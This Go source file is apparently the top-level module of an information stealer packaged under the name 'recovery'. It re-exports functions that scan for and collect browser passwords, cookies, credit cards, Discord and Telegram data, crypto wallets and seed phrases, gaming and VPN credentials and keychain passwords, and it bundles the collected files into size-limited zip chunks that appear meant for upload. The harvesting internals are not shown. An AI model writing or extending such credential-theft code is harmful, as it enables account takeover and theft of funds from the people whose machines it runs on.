package recovery

import (
	"recovery/recovery/scanner"
	"recovery/recovery/types"
	"recovery/recovery/ziputil"
)

type CollectOptions = types.CollectOptions
type CollectionResult = types.CollectionResult
type BrowserConfig = types.BrowserConfig
type ProfileInfo = types.ProfileInfo
type ResolvedKeys = types.ResolvedKeys
type PasswordResult = types.PasswordResult
type CookieResult = types.CookieResult
type AutofillResult = types.AutofillResult
type HistoryResult = types.HistoryResult
type BookmarkResult = types.BookmarkResult
type CreditCardResult = types.CreditCardResult
type DiscordTokenResult = types.DiscordTokenResult
type FileResult = types.FileResult
type ExtensionResult = types.ExtensionResult
type WalletResult = types.WalletResult
type TelegramResult = types.TelegramResult
type KeyResult = types.KeyResult
type SeedResult = types.SeedResult
type AppCredentialResult = types.AppCredentialResult
type GamingResult = types.GamingResult
type SteamResult = types.SteamResult
type GameInfo = types.GameInfo
type BattleNetResult = types.BattleNetResult
type EpicResult = types.EpicResult
type RiotResult = types.RiotResult
type UplayResult = types.UplayResult
type VPNResult = types.VPNResult
type NordVPNResult = types.NordVPNResult
type WireGuardResult = types.WireGuardResult
type OpenVPNResult = types.OpenVPNResult
type MullvadResult = types.MullvadResult

func ScanExtensions() []ExtensionResult     { return scanner.ScanExtensions() }
func ScanFiles() []FileResult               { return scanner.ScanFiles() }
func ScanWallets() []WalletResult           { return scanner.ScanWallets() }

type WalletExtensionBundle = scanner.WalletExtensionBundle
type WalletExtensionFileEntry = scanner.WalletExtensionFileEntry
type DesktopWalletBundle = scanner.DesktopWalletBundle

func CollectWalletExtensionBundles() []WalletExtensionBundle {
	return scanner.CollectWalletExtensionBundles()
}

func CollectDesktopWalletBundles() []DesktopWalletBundle {
	return scanner.CollectDesktopWalletBundles()
}
func ScanTelegram() []TelegramResult    { return scanner.ScanTelegram() }
func ScanApps() []AppCredentialResult { return scanner.ScanApps() }
func ScanKeys() []KeyResult           { return scanner.ScanKeys() }
func FetchFile(path string) ([]byte, error) { return scanner.FetchFile(path) }
func ZipDirectory(dir string) ([]byte, error) { return ziputil.ZipDirectory(dir) }

type ZipFileEntry = ziputil.FileEntry

func ZipFileEntries(entries []ZipFileEntry) ([]byte, error) {
	return ziputil.ZipFileEntries(entries)
}

func ZipFileEntriesChunked(entries []ZipFileEntry, maxBytes int) ([][]byte, error) {
	return ziputil.ZipFileEntriesChunked(entries, maxBytes)
}

func ScanSeeds(files []FileResult, passwords []PasswordResult, autofill []AutofillResult) []SeedResult {
	return scanner.ScanSeeds(files, passwords, autofill)
}

type PasswordCandidateResult = types.PasswordCandidateResult

func CollectKeychainPasswordCandidates() []PasswordCandidateResult {
	return scanner.CollectKeychainPasswordCandidates()
}

func BuildPasswordCandidates(passwords []PasswordResult, autofill []AutofillResult, keychain []PasswordCandidateResult) []PasswordCandidateResult {
	return scanner.BuildPasswordCandidates(passwords, autofill, keychain)
}

func AppendExtraPasswordCandidates(candidates []PasswordCandidateResult, result *CollectionResult) []PasswordCandidateResult {
	return scanner.AppendExtraPasswordCandidates(candidates, result)
}
